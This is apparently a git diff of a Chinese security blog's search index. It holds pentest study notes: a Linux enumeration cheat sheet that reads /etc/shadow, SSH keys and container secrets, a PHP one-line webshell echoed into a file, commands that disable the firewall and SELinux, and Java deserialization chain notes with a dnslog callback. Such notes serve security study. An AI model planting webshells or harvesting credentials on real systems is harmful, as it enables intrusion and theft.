/proc/<span class="variable">$PID</span>/environ</span><br><span class="line">进程打开文件的情况 /proc/<span class="variable">$PID</span>/fd</span><br><span class="line">6.2.1.6. 服务信息</span><br><span class="line">由inetd管理的服务列表 <span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line">由xinetd管理的服务列表 <span class="built_in">cat</span> /etc/xinetd.conf</span><br><span class="line">nfs服务器的配置 <span class="built_in">cat</span> /etc/exports</span><br><span class="line">邮件信息 /var/log/mailog</span><br><span class="line">ssh配置 sshd_config</span><br><span class="line">6.2.1.7. 计划任务</span><br><span class="line">显示指定用户的计划作业（root） crontab -l -u %user%</span><br><span class="line">计划任务</span><br><span class="line">/var/spool/cron/*</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/cron.*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br><span class="line">6.2.1.8. 网络、路由和通信</span><br><span class="line">列出网络接口信息 /sbin/ifconfig -a / ip addr show</span><br><span class="line">列出网络接口信息 <span class="built_in">cat</span> /etc/network/interfaces</span><br><span class="line">查看系统arp表 arp -a</span><br><span class="line">打印路由信息 route / ip ro show</span><br><span class="line">查看dns配置信息 <span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">打印本地端口开放信息 netstat -an</span><br><span class="line">列出iptable的配置规则 iptables -L</span><br><span class="line">查看端口服务映射 <span class="built_in">cat</span> /etc/services</span><br><span class="line">Hostname hostname -f</span><br><span class="line">查看进程端口情况 netstat -anltp | grep <span class="variable">$PID</span></span><br><span class="line">6.2.1.9. 已安装程序</span><br><span class="line">rpm -qa --last Redhat</span><br><span class="line">yum list | grep installed CentOS</span><br><span class="line"><span class="built_in">ls</span> -l /etc/yum.repos.d/</span><br><span class="line">dpkg -l Debian</span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list Debian APT</span><br><span class="line">pkg_info xBSD</span><br><span class="line">pkginfo Solaris</span><br><span class="line">pacman -Q Arch Linux</span><br><span class="line">emerge Gentoo</span><br><span class="line">6.2.1.10. 文件</span><br><span class="line">最近五天的文件 find / -ctime +1 -ctime -5</span><br><span class="line">文件系统细节 debugfs</span><br><span class="line">6.2.1.11. 公私钥信息</span><br><span class="line">~/.ssh</span><br><span class="line">/etc/ssh</span><br><span class="line">6.2.1.12. 日志</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/run/utmp</span><br><span class="line">6.2.1.13. 虚拟环境检测</span><br><span class="line">lsmod | grep -i <span class="string">&quot;vboxsf\|vboxguest&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;vmw_baloon\|vmxnet&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;xen-vbd\|xen-vnif&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;virtio_pci\|virtio_net&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span></span><br><span class="line">6.2.1.14. 容器内信息收集</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">env</span> | grep KUBE</span><br><span class="line"><span class="built_in">ls</span> -l .dockerenv</span><br><span class="line"><span class="built_in">ls</span> -l /run/secrets/Kubernetes.io/</span><br><span class="line">mount</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>
+<h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><h6 id="less"><a href="#less" class="headerlink" title="less"></a>less</h6><p>less和more类似,但是使用less可以随意浏览文件,而more仅能向前移动,却不能向后移动,more启动时会加载整个文件。而且less在查看之前不会加载整个文件  </p>
+<h6 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h6><p>用来处理文本，将文本按照指定的格式输出。其中包含了变量，循环以及数组</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]#awk -F: &#x27;&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h6 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h6><p>进去容器中</p>
+<p>docker exec -it  <id> &#x2F;bin&#x2F;bash</p>
+<h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><p>-sn   基础主机发现</p>
+<p>-sc  默认脚本</p>
+<p>–script&#x3D;vuln 脚本扫描    脚本路径在&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts</p>
+<p>– ssl-enum-ciphers    ssl版本漏洞</p>
+<p>-pn &#x2F;-p0   无ping扫描</p>
+<h6 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入一句话木马</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&#x27;</span> &gt; 1.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&#x27;</span> &gt;&gt; 1.php</span><br><span class="line"><span class="comment">#查找指定目录的指定文件名</span></span><br><span class="line">find /root -name <span class="string">&quot;1.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#乱码</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment">#切换账户到admin</span></span><br><span class="line">su -l admin </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户</span></span><br><span class="line">useradd   name  </span><br><span class="line">passwd   name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态网卡</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno</span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#关闭防火墙和临时禁用selinux安全模块</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment">#清空防火墙规则</span></span><br><span class="line">iptables -F</span><br><span class="line">获取内核，操作系统和设备信息</span><br><span class="line">版本信息</span><br><span class="line"><span class="built_in">uname</span> -a 所有版本</span><br><span class="line"><span class="built_in">uname</span> -r 内核版本信息</span><br><span class="line"><span class="built_in">uname</span> -n 系统主机名字</span><br><span class="line"><span class="built_in">uname</span> -m Linux内核架构</span><br><span class="line">内核信息 <span class="built_in">cat</span> /proc/version</span><br><span class="line">CPU信息 <span class="built_in">cat</span> /proc/cpuinfo</span><br><span class="line">发布信息</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line">主机名 hostname</span><br><span class="line">文件系统 <span class="built_in">df</span> -a</span><br><span class="line">内核日志 dmesg / /var/log/dmesg</span><br><span class="line">6.2.1.2. 用户和组</span><br><span class="line">列出系统所有用户 <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">列出系统所有组 <span class="built_in">cat</span> /etc/group</span><br><span class="line">列出所有用户<span class="built_in">hash</span>（root）``<span class="built_in">cat</span> /etc/shadow``</span><br><span class="line">用户</span><br><span class="line">查询用户的基本信息 finger</span><br><span class="line">当前登录的用户 <span class="built_in">users</span> <span class="built_in">who</span> -a /var/log/utmp</span><br><span class="line">查询无密码用户 grep <span class="string">&#x27;x:0:&#x27;</span> /etc/passwd</span><br><span class="line">目前登录的用户 w</span><br><span class="line">登入过的用户信息 last / /var/log/wtmp</span><br><span class="line">显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog</span><br><span class="line">登录成功日志 /var/log/secure</span><br><span class="line">登录失败日志 /var/log/faillog</span><br><span class="line">查看特权用户 grep :0 /etc/passwd</span><br><span class="line">查看passwd最后修改时间 <span class="built_in">ls</span> -l /etc/passwd</span><br><span class="line">查看是否存在空口令用户 awk -F: <span class="string">&#x27;length($2)==0 &#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看远程登录的账号 awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看具有sudo权限的用户</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line">6.2.1.3. 用户和权限信息</span><br><span class="line">当前用户 <span class="built_in">whoami</span></span><br><span class="line">当前用户信息 <span class="built_in">id</span></span><br><span class="line">可以使用sudo提升到root的用户（root） <span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">列出目前用户可执行与无法执行的指令 sudo -l</span><br><span class="line">6.2.1.4. 环境信息</span><br><span class="line">打印系统环境信息 <span class="built_in">env</span></span><br><span class="line">打印系统环境信息 <span class="built_in">set</span></span><br><span class="line">环境变量中的路径信息 <span class="built_in">echo</span>  <span class="variable">$PATH</span></span><br><span class="line">打印历史命令 <span class="built_in">history</span> / ~/.bash_history</span><br><span class="line">显示当前路径 <span class="built_in">pwd</span></span><br><span class="line">显示默认系统遍历 <span class="built_in">cat</span> /etc/profile</span><br><span class="line">显示可用的shell <span class="built_in">cat</span> /etc/shells</span><br><span class="line">6.2.1.5. 进程信息</span><br><span class="line">查看进程信息 ps aux</span><br><span class="line">资源占有情况 top -c</span><br><span class="line">查看进程关联文件 lsof -c <span class="variable">$PID</span></span><br><span class="line">完整命令行信息 /proc/<span class="variable">$PID</span>/cmdline</span><br><span class="line">进程的命令名 /proc/<span class="variable">$PID</span>/comm</span><br><span class="line">进程当前工作目录的符号链接 /proc/<span class="variable">$PID</span>/cwd</span><br><span class="line">运行程序的符号链接 /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">进程的环境变量 /proc/<span class="variable">$PID</span>/environ</span><br><span class="line">进程打开文件的情况 /proc/<span class="variable">$PID</span>/fd</span><br><span class="line">6.2.1.6. 服务信息</span><br><span class="line">由inetd管理的服务列表 <span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line">由xinetd管理的服务列表 <span class="built_in">cat</span> /etc/xinetd.conf</span><br><span class="line">nfs服务器的配置 <span class="built_in">cat</span> /etc/exports</span><br><span class="line">邮件信息 /var/log/mailog</span><br><span class="line">ssh配置 sshd_config</span><br><span class="line">6.2.1.7. 计划任务</span><br><span class="line">显示指定用户的计划作业（root） crontab -l -u %user%</span><br><span class="line">计划任务</span><br><span class="line">/var/spool/cron/*</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/cron.*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br><span class="line">6.2.1.8. 网络、路由和通信</span><br><span class="line">列出网络接口信息 /sbin/ifconfig -a / ip addr show</span><br><span class="line">列出网络接口信息 <span class="built_in">cat</span> /etc/network/interfaces</span><br><span class="line">查看系统arp表 arp -a</span><br><span class="line">打印路由信息 route / ip ro show</span><br><span class="line">查看dns配置信息 <span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">打印本地端口开放信息 netstat -an</span><br><span class="line">列出iptable的配置规则 iptables -L</span><br><span class="line">查看端口服务映射 <span class="built_in">cat</span> /etc/services</span><br><span class="line">Hostname hostname -f</span><br><span class="line">查看进程端口情况 netstat -anltp | grep <span class="variable">$PID</span></span><br><span class="line">6.2.1.9. 已安装程序</span><br><span class="line">rpm -qa --last Redhat</span><br><span class="line">yum list | grep installed CentOS</span><br><span class="line"><span class="built_in">ls</span> -l /etc/yum.repos.d/</span><br><span class="line">dpkg -l Debian</span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list Debian APT</span><br><span class="line">pkg_info xBSD</span><br><span class="line">pkginfo Solaris</span><br><span class="line">pacman -Q Arch Linux</span><br><span class="line">emerge Gentoo</span><br><span class="line">6.2.1.10. 文件</span><br><span class="line">最近五天的文件 find / -ctime +1 -ctime -5</span><br><span class="line">文件系统细节 debugfs</span><br><span class="line">6.2.1.11. 公私钥信息</span><br><span class="line">~/.ssh</span><br><span class="line">/etc/ssh</span><br><span class="line">6.2.1.12. 日志</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/run/utmp</span><br><span class="line">6.2.1.13. 虚拟环境检测</span><br><span class="line">lsmod | grep -i <span class="string">&quot;vboxsf\|vboxguest&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;vmw_baloon\|vmxnet&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;xen-vbd\|xen-vnif&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;virtio_pci\|virtio_net&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span></span><br><span class="line">6.2.1.14. 容器内信息收集</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">env</span> | grep KUBE</span><br><span class="line"><span class="built_in">ls</span> -l .dockerenv</span><br><span class="line"><span class="built_in">ls</span> -l /run/secrets/Kubernetes.io/</span><br><span class="line">mount</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>
 
 
 
@@ -905,6 +1055,12 @@
 <p>静态代理不易于项目维护，会造成冗余，</p>
 </blockquote>
 <p>动态代理是通过实现接口的方式来实现代理，通过proxy类创建代理对象，然后将接口方法’代理‘给InvocationHandler接口完成的（实现InvocationHandler需要重写	invoke方法）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    IUser user;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        method.invoke(user, args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">proxy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">UserInvocationHandler</span> <span class="variable">userInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userProxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(), userInvocationHandler);</span><br><span class="line">        userProxy.show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <p><strong>CGLib</strong></p>
 <blockquote>
 <p>动态代理基于反射机制实现的，必须实现接口的业务类才能使用这种办法生成代理对象，只能基于接口设计，对于没有接口的情况，JDK方式无法解决，而CGLib采用非常底层的字节码技术，性能也表现不错</p>
@@ -912,11 +1068,67 @@
 <p>一个第三方代码生成类库，基于asm机制实现的，通过实现生成业务类的子类作为代理类</p>
 <p><strong>javassist动态编程</strong></p>
 <p>静态编程的类型检查是在编译时完成的，对于动态编程来说，类型检查是在运行时完成的 ，因此所谓的动态编程就是绕过编译过程在运行时进行操作的技术</p>
+<h4 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h4><p>类加载会执行代码</p>
+<p>初始化：静态代码块</p>
+<p>实例化：构造代码块，无参构造函数</p>
+<p>2.动态类加载方法</p>
+<p>Class.forName(“类”)   这个会有初始化操作，静态代码块执行</p>
+<p>Class.forName(“类”，false，ClassLoader.getSystemClassLoader())   这样就不会初始化</p>
+<p>ClassLoader.loadClass不进行初始化</p>
+<p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p>
+<p>loadClass-&gt;findClass(重写方法)-&gt;defineClass(字节码加载类)</p>
+<p>URLClassLoader 任意类加载   file&#x2F;http&#x2F;jar       jar:<a href="http://localhost:9999/Helllo.jar">http://localhost:9999/Helllo.jar</a></p>
+<p>defineClass字节码加载任意类   私有</p>
+<p>Unsafe.defineClass字节码加载public类不能直接生成   spring 里面可以直接生成</p>
 <h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p>loadClass()方法只对类进行加载，不会对类进行初始化。Class.forName 会默认对<br>类进行初始化(初始化就是静态代码块会执行)</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class实例化对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        <span class="comment">//getFields不能打印private</span></span><br><span class="line"><span class="comment">//        Field[] personfields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f : personfields) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line"><span class="comment">//        调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] personmethods = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m : personmethods) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">        actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        actionmethod.invoke(p,<span class="string">&quot;asdasd&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 
 
+<h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>吧url放到hashmap里边，hashMap的hashCode函数可以反序列化</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230716160846520.png" alt="image-20230716160846520"></p>
+<p>1.hashmap接受参数O</p>
+<p>2.目标类B URL</p>
+<p>3.调用B.hashcode</p>
+<p>4.hashmap.readObject –&gt;O.hashcode</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"><span class="comment">//        这里不要发起请求，吧url对象的hashcode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://tp12s4.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//		这里吧url对象的hashcodde改成1234</span></span><br><span class="line">        hashCodefield.set(url, <span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//这里吧hashcode改回-1</span></span><br><span class="line">        <span class="comment">//通过反射，改变已有对象的属性</span></span><br><span class="line"><span class="comment">//        hashCodefield.set(url,-1);</span></span><br><span class="line">        serialize(hashmap);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>分析反序列化</p>
+<p>在反序列化漏洞中的应用</p>
+<p>​    定制需要的对象</p>
+<p>​	通过invoke调用除了同名函数以外的函数</p>
+<p>​	通过class类创建对象，引入不能序列化的类</p>
+<p>​	runtime.class</p>
+<p>java反序列化漏洞</p>
+<p>关于防御</p>
+<h3 id="Hibernate-反序列化链"><a href="#Hibernate-反序列化链" class="headerlink" title="Hibernate 反序列化链"></a>Hibernate 反序列化链</h3><p><a href="https://mp.weixin.qq.com/s/mJfUKEHAB08xwBC-CtC31w">https://mp.weixin.qq.com/s/mJfUKEHAB08xwBC-CtC31w</a></p>
+<h3 id="CommonsCollections链1"><a href="#CommonsCollections链1" class="headerlink" title="CommonsCollections链1"></a>CommonsCollections链1</h3><blockquote>
+<p>jdk版本8u65    8u71开始就修复了 </p>
+<p>原理：接收任意对象，执行readobject方法</p>
+</blockquote>
+<p>流程：</p>
+<p>1.A.readobject，调用了O.aaa </p>
+<p>2.修改O.aaa，调用O2.xxx</p>
+<p>3.一直往后推，直到一个危险方法，</p>
+<p>4.用Runtime.getRuntime.exec()执行</p>
+<p>可以用不同类的同名函数，或者任意方法调用(比如说反射，动态加载字节码)</p>
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>jdk8u65</p>
+<p><a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
+<p>open</p>
+<p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
+<p>解压，&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun目录放到jdk8u65里面的src</p>
+<p>maven</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>所有的 都可以序列化，重写readobject，接收任意对象作为参数</p>
 <h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>参数化查询，预编译</p>
 <p><strong>mybatis</strong></p>
 <p>#和$的区别，MyBatis 中使用 parameterType 向 SQL 语句传参，在 SQL 引用传参可以使用<br>#{Parameter}和${Parameter}两种方式。</p>
@@ -1026,26 +1238,8 @@
 </ul>
 <p>官方手册中也表明了应当限制普通用户可以上传和限制模板文件的权限，OFCMS1.1.2版本的注入漏洞正是可编辑模板文件造成的任意代码执行</p>
 <h3 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h3><p>jwt token猜解实验</p>
-<h4 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h4><p>吧url放到hashmap里边，hashMap的hashCode函数可以反序列化</p>
-<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230716160846520.png" alt="image-20230716160846520"></p>
-<p>1.hashmap接受参数O</p>
-<p>2.目标类B URL</p>
-<p>3.调用B.hashcode</p>
-<p>4.hashmap.readObject –&gt;O.hashcode</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"><span class="comment">//        这里不要发起请求，吧url对象的hashcode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://tp12s4.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//		这里吧url对象的hashcodde改成1234</span></span><br><span class="line">        hashCodefield.set(url, <span class="number">1234</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//这里吧hashcode改回-1</span></span><br><span class="line">        <span class="comment">//通过反射，改变已有对象的属性</span></span><br><span class="line"><span class="comment">//        hashCodefield.set(url,-1);</span></span><br><span class="line">        serialize(hashmap);</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>分析反序列化</p>
-<p>在反序列化漏洞中的应用</p>
-<p>​    定制需要的对象</p>
-<p>​	通过invoke调用除了同名函数以外的函数</p>
-<p>​	通过class类创建对象，引入不能序列化的类</p>
-<p>​	runtime.class</p>
-<p>java反序列化漏洞</p>
-<p>关于防御</p>
+<blockquote>
+</blockquote>
 ]]></content>
       <tags>
         <tag>java</tag>
@@ -1175,7 +1369,12 @@
 <p><a href="http://10.10.4.89:25672/">http://10.10.4.89:25672/</a></p>
 <p><a href="http://10.10.4.89:15692/">http://10.10.4.89:15692/</a></p>
 <p>默认账号密码都是guest</p>
-<h3 id="13-sprintboot-actuator未授权访问"><a href="#13-sprintboot-actuator未授权访问" class="headerlink" title="13.sprintboot actuator未授权访问"></a>13.sprintboot actuator未授权访问</h3><p>漏洞特征，图标(绿叶子)和报错页面</p>
+<h3 id="13-sprintboot-actuator未授权访问"><a href="#13-sprintboot-actuator未授权访问" class="headerlink" title="13.sprintboot actuator未授权访问"></a>13.sprintboot actuator未授权访问</h3><blockquote>
+<p>扫描工具：<a href="https://github.com/F6JO/RouteVulScan">https://github.com/F6JO/RouteVulScan</a></p>
+<p>解压工具：<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p>
+<p>扫描ak&#x2F;sk泄露文件  heapdump</p>
+</blockquote>
+<p>漏洞特征，图标(绿叶子)和报错页面</p>
 <p>漏洞验证</p>
 <p>直接访问相关路径：</p>
 <p><a href="http://10.2.20.48/autoconfig">http://10.2.20.48:/autoconfig</a></p>
@@ -1238,8 +1437,26 @@
   <entry>
     <title>面试题</title>
     <url>/2023/06/28/%E9%95%BF%E4%BA%AD%E9%9D%A2%E8%AF%95/</url>
-    <content><![CDATA[<p>ct蓝中</p>
